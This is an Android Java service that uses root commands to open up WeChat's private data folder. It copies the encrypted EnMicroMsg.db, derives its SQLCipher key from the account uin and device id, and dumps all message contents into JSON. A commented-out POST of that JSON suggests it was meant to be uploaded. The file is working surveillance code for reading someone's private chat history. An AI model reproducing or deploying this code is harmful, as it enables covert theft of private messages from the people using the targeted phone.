package com.example.sqlciphertest;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;
import example.EventDataSQLHelper;
import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

public class MainService extends Service
{
	EventDataSQLHelper eventsData;
	private File file;
	private String path = "1";
	private String key;
	private String md5;
    private String[] paths2 = new String[10];
    private String[] paths = new String[10];
    JSONObject json1 = new JSONObject();
	
    private final Handler msgHandler = new Handler(){  
        public void handleMessage(Message msg) {
        	switch (msg.arg1) {  
                case 200:
                	Toast.makeText(MainService.this, "成功访问", Toast.LENGTH_SHORT).show();
                	break;  
                default:
                	Toast.makeText(MainService.this, "未成功访问", Toast.LENGTH_SHORT).show();
                	break;  
            }  
        }  
    };  
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override  
    public void onCreate() {  
        super.onCreate();  
    }  
      
	@Override  
    public void onStart(Intent intent, int startId) {  
        super.onStart(intent, startId);
        file = new File("/data/data/com.tencent.mm/MicroMsg");
        key = "EnMicroMsg.db";
        File data = getDatabasePath("/data");
        String dataString = "chmod 777 "+data;
        SystemManager.RootCommand(dataString);
        paths2 = this.findFile(file);
		this.cut();
		String aString = md5;
		this.chmodFile(paths2);
		Thread newThread;
		newThread = new Thread(new Runnable() {
			public void run() {
				try {   
					//HttpPost postMethod = new HttpPost("");   
					//postMethod.setEntity(new StringEntity(json1.toString())); 
					//将参数填入POST Entity中  
					//HttpResponse response = new DefaultHttpClient().execute(postMethod);
					HttpGet getMethod = new HttpGet("http://www.baidu.com");
					HttpResponse response = new DefaultHttpClient().execute(getMethod);
					Message message = msgHandler.obtainMessage();
					message.arg1 = response.getStatusLine().getStatusCode();
					msgHandler.sendMessage(message);
					//执行POST方法   
					Log.i("db", "resCode = " + response.getStatusLine().getStatusCode()); 
					//获取响应码   
					Log.i("db", "result = " + EntityUtils.toString(response.getEntity(), "utf-8")); 
					//获取响应内容  
					} catch (UnsupportedEncodingException e) {   
						// TODO Auto-generated catch block   
						e.printStackTrace();  
					} catch (ClientProtocolException e) {   
						// TODO Auto-generated catch block   
						e.printStackTrace();  
					} catch (IOException e) {   
						// TODO Auto-generated catch block   
						e.printStackTrace();  
					} 
			}
		});
		newThread.start();
    }  
      
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        return super.onStartCommand(intent, flags, startId);  
    }
    
    public void chmodFile(String[] pathss) {
		if(pathss.length > 0) {
			for(int j=1; j<pathss.length; j++) {
				File databaseFile = getDatabasePath(paths[j]);
				String apkRoot="chmod 777 "+databaseFile;
				SystemManager.RootCommand(apkRoot);
				int res2 = copyFile(paths[j], "/data/EnMicroMsg.db");
				if (res2 > 0) {
					File databaseFile2 = getDatabasePath("/data/EnMicroMsg.db");
				    String apkRoot2="chmod 777 "+databaseFile2;
				    SystemManager.RootCommand(apkRoot2);
				    int dint = this.readWeChatDatabase("/data/EnMicroMsg.db");
				    if(dint == 0) {
					    continue;
				    }
				    if(dint == 1) {
					    Toast.makeText(this, "成功", Toast.LENGTH_SHORT).show();
					    break;
				    }
				}
				
			}
		}
	}
	public String[] findFile(File file) {
		try {
			File[] files = file.listFiles();
			if(files.length > 0) {
				int i=0;
				for(int j=0; j<files.length; j++) {
					if(!files[j].isDirectory())
					{
						if(files[j].getName().substring(0).equals(key)) {
							path +=" " + files[j].getPath();
						}
					}
					else
					{
						this.findFile(files[j]);
					}
				}
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
		paths = path.split(" ");
		return paths;
	}
	public void deletFile(String Path) {
		File file = new File(Path);
		if(file.isFile()) {
			file.delete();
		}
	}
	public int copyFile(String oldPath, String newPath) {   
	       try {   
	           int bytesum = 0;   
	           int byteread = 0;
	           int res;
	           File oldfile = new File(oldPath);   
	           if (oldfile.exists()) { //文件存在时   
	               InputStream inStream = new FileInputStream(oldPath); //读入原文件   
	               FileOutputStream fs = new FileOutputStream(newPath);   
	               byte[] buffer = new byte[2048];   
	               int length;   
	               while ( (byteread = inStream.read(buffer)) != -1) {   
	                   bytesum += byteread; //字节数 文件大小   
	                   System.out.println(bytesum);   
	                   fs.write(buffer, 0, byteread);   
	               }   
	               inStream.close();
	               res = 1;
	           }
	           else {
	        	   res = 0;
	           }
	           return res;
	       }   
	       catch (Exception e) {   
	           System.out.println("复制单个文件操作出错");   
	           e.printStackTrace();   
	           return 0;
	       }   
	  
	   }
	public void cut() {
		FileInputStream sysFile = null;
		FileInputStream compatiFile = null;
		try {
			sysFile = new FileInputStream("/data/data/com.tencent.mm/MicroMsg/systemInfo.cfg");
			ObjectInputStream objectInputStream = new ObjectInputStream(sysFile);
			Map DL = (Map)objectInputStream.readObject();
			Integer meid = (Integer)DL.get(1);
			System.out.println("meid: "+meid);
			compatiFile = new FileInputStream("/data/data/com.tencent.mm/MicroMsg/CompatibleInfo.cfg");
			ObjectInputStream objectInputStream2 = new ObjectInputStream(compatiFile);
			Map DL2 = (Map)objectInputStream2.readObject();
			String uin = (String)DL2.get(258);
			System.out.println("uin: "+uin);
			md5 = getMD5(uin+meid).substring(0,7);
			System.out.println("uin: "+md5);
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	public String getMD5(String info)
	{
	  try
	  {
	    MessageDigest md5 = MessageDigest.getInstance("MD5");
	    md5.update(info.getBytes("UTF-8"));
	    byte[] encryption = md5.digest();
	      
	    StringBuffer strBuf = new StringBuffer();
	    for (int i = 0; i < encryption.length; i++)
	    {
	      if (Integer.toHexString(0xff & encryption[i]).length() == 1)
	      {
	        strBuf.append("0").append(Integer.toHexString(0xff & encryption[i]));
	      }
	      else
	      {
	        strBuf.append(Integer.toHexString(0xff & encryption[i]));
	      }
	    }
	      
	    return strBuf.toString();
	  }
	  catch (NoSuchAlgorithmException e)
	  {
	    return "";
	  }
	  catch (UnsupportedEncodingException e)
	  {
	    return "";
	  }
	}
    public int readWeChatDatabase(String databasePath) {
		
		SQLiteDatabase.loadLibs(MainService.this);
		String password = md5;//f7fb70e"192c47c"	
		//File databaseFile = getDatabasePath("/data/data/com.tencent.mm/MicroMsg/974f4bcff8c604534f076a1a34281165/EnMicroMsg.db");
		//File databaseFile = getDatabasePath("/storage/emulated/0/DCIM/EnMicroMsg.db");
		File databaseFile = getDatabasePath(databasePath);
		eventsData = new EventDataSQLHelper(this);
		
		SQLiteDatabaseHook hook = new SQLiteDatabaseHook(){
			  public void preKey(SQLiteDatabase database){
				  //database.rawExecSQL("PRAGMA cipher_default_use_hmac=off;");
			  }
			  public void postKey(SQLiteDatabase database){
				  database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
			  }
		};
	
		try {
			SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(databaseFile, md5, null, hook);//f7fb70e	"192c47c"	
			Cursor c = db.query("message", null, null, null, null, null, null);
			JSONArray jsonArray = new JSONArray();
			JSONObject json2 = new JSONObject();
			while (c.moveToNext()) {  
				int _id = c.getInt(c.getColumnIndex("msgId"));  
				String name = c.getString(c.getColumnIndex("content"));  
				Log.i("db", "_id=>" + _id + ", content=>" + name);
				json2.put(Integer.toString(_id), name);
			}
			jsonArray.put(json2);
			json1.put("message", jsonArray);
			c.close();
			db.close();
			return 1;
		} catch (Exception e) {
			return 0;
		}
	}
}